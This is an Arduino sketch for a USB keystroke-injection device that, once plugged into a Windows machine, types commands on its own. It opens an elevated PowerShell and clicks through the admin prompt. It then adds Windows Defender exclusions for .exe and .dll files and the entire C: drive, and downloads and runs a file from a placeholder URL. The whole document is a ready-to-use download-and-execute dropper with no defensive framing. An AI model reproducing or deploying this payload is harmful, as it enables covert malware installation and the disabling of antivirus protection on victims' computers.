
#include <Keyboard.h>
void setup() {
String url = "url";
String file = "file";
Keyboard.begin();
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(500);
Keyboard.print("powershell.exe Set-WinUserLanguageList -LanguageList en-US -force; exit;");
typeKey(KEY_RETURN);
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(1000);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
typeKey(KEY_RETURN);
delay(4000);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(1000);
Keyboard.print(" Add-MpPreference -ExclusionExtension exe,dll -Force ");
typeKey(KEY_RETURN);
delay(500);
Keyboard.print(" Add-MpPreference -ExclusionPath C:\ ");
typeKey(KEY_RETURN);
delay(500);
Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = \"tls12, tls11, tls\"; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
typeKey(KEY_RETURN);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
